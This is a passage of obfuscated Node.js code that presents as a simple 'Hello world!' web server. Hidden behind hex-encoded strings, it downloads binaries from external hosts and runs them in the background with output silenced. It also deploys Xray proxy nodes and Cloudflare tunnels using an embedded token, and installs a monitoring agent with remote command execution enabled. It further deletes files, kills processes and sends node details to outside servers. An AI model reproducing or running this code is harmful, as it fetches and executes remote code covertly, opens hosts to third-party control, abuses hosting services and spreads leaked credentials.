_0x3a0dea=_0x36228e;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x3a0dea(0xae));return;}try{const _0x3c3197={};_0x3c3197[_0x3a0dea(0x136)]=PROJECT_URL;const _0x3daf37={};_0x3daf37[_0x3a0dea(0x16f)]=_0x3a0dea(0x11d);const _0x2ccd7a={};_0x2ccd7a[_0x3a0dea(0x187)]=_0x3daf37;const _0x2ba628=await axios[_0x3a0dea(0x168)](_0x3a0dea(0xc3),_0x3c3197,_0x2ccd7a);return console[_0x3a0dea(0x15d)](_0x3a0dea(0x133)),_0x2ba628;}catch(_0x209a47){return console[_0x3a0dea(0x170)](_0x3a0dea(0x163)+_0x209a47[_0x3a0dea(0x139)]),null;}}async function startserver(){const _0xace69f=_0x36228e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4cd673){console[_0xace69f(0x170)](_0xace69f(0x14e),_0x4cd673);}}function _0x194d(){const _0x394c0a=['settings','path','SERVER_PORT','outbounds','get','./tmp','ARGO_DOMAIN:','country_code','recursive','length','\x20is\x20created','host','arch','?encryption=none&security=tls&sni=','2083','eyJhIjoiYzZjYjc4NDJiZjM0NDQ3ZGRmZjUyNjAyYTE2ZDVlMWEiLCJ0IjoiMDVjZDIwYjMtZDlhOC00YWU3LTg0ODgtOTY4MzA0Nzk3OWQyIiwicyI6Ik5Ea3haREptTURVdE9HWmxZaTAwWlRsbExUaGtPRGt0T1dGaE1qSmxNV0prWkdGaSJ9','Unhandled\x20error\x20in\x20startserver:','https://arm64.ssss.nyc.mn/agent','lea.hun93.cloudns.biz','false','chmod','map','nodes','flow','decryption','234fzCkdc','child_process','\x20already\x20exists','clients','PORT','application/json','split','\x20>/dev/null\x202>&1','\x20-c\x20\x22','countryCode','\x0a\x20\x20\x20\x20','timeout','App\x20is\x20running','wsSettings','readFileSync','fallbacks','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlinkSync','clear','Subscription\x20uploaded\x20successfully','alpn','status','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/vmess-argo?ed=2560','\x20is\x20running','servers','xtls-rprx-vision','automatic\x20access\x20task\x20added\x20successfully','base64','abcdefghijklmnopqrstuvwxyz','url','UUID','7FeGYjp','message','send','NEZHA_SERVER','\x20-p\x20','dest','crbvinmnqpyv.us-west-1.clawcloudrun.com:80','none','blackhole','join','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','taskkill\x20/f\x20/im\x20','Empowerment\x20failed\x20for\x20','net','83823RgtcAf','https://arm64.ssss.nyc.mn/v1','firefox','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Hello\x20world!','toString','http','Error\x20in\x20startserver:','catch','\x20>/dev/null\x202>&1\x20&','alterId','6sMYIXw','sni','aid','has','platform','rm\x20-rf\x20','block','sniffing','fu258369','4fEoVyK','\x20>\x20nul\x202>&1','log','level','/dev/null','\x22\x20>\x20/dev/null\x202>&1','/vmess-argo','floor','Add\x20automatic\x20access\x20task\x20faild:\x20','then','892056AiCwBi','Empowerment\x20success\x20for\x20','2087','post','NEZHA_KEY','http\x20server\x20is\x20running\x20on\x20port:','freedom','success','forEach','https://amd64.ssss.nyc.mn/agent','Content-Type','error','utf-8','&fp=firefox&type=ws&host=','?security=tls&sni=','\x0a\x0atrojan://','PROJECT_URL','&path=%2Fvless-argo%3Fed%3D2560#','\x0a\x20\x20tunnel:\x20','scy','type','127.0.0.1','22qyXOfV','NAME','push','pkill\x20-f\x20\x22[','ARGO_PORT','metadataOnly','method','listen','streamSettings','/trojan-argo','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','headers','destOverride','tls','ARGO_DOMAIN','port','writeFileSync','32480JIwYDk','ArgoDomain:','from','https://arm64.ssss.nyc.mn/bot','aarch64','close','basename','Skipping\x20adding\x20automatic\x20access\x20task','data','org','\x0a\x0avmess://','trojan','mkdirSync','exec','web\x20running\x20error:\x20','includes','tcp','pop','existsSync','/sub.txt\x20saved\x20successfully','createWriteStream','AUTO_ACCESS','npm\x20running\x20error:\x20','unshift','ARGO_AUTH','quic','express','axios','https://oooo.serv00.net/add-url','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1979592migUNq','cdns.doon.eu.org','stringify','direct','.exe\x20>\x20nul\x202>&1','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','861915DKBMiH','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','finish','response','match','nohup\x20','boot.log','network','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','substring','/api/add-subscriptions','dns','Nodes\x20uploaded\x20successfully','add','\x0a\x20\x20credentials-file:\x20','enabled','protocol','win32','Download\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','sub.txt','\x20failed:\x20','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','statSync','text/plain;\x20charset=utf-8','/vless-argo','tag','SUB_PATH','inbounds','7ff3e2e5-4234-4e26-b6b6-cf24d9c7b8b8','test','vless','fileUrl','https://amd64.ssss.nyc.mn/v1','config.json','98322cgDKkB','fileName','tunnel.json','security','2096','pipe','2108344SWhEXs','NEZHA_PORT','random','arm','8443','env','list.txt','subscription'];_0x194d=function(){return _0x394c0a;};return _0x194d();}startserver()[_0x36228e(0x14f)](_0x3402d7=>{const _0x55a50a=_0x36228e;console[_0x55a50a(0x170)](_0x55a50a(0x10f),_0x3402d7);}),app[_0x36228e(0x182)](PORT,()=>console[_0x36228e(0x15d)](_0x36228e(0x16a)+PORT+'!'));
